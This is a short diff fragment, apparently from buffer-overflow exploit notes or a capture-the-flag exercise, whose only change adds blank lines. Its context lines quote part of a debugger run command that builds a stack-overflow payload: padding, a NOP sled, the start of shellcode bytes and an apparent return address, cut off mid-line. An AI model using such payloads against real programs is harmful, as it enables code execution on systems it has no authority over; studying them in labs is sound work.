@@ -122,3 +122,6 @@ run $(python -c 'print "\x55"*(2064 - 100 - 95 -4)+"\x90"*100 + "\xd9\xf6\xb8\x9
 
 
 \x88\xd6\xff\xff
+
+
+
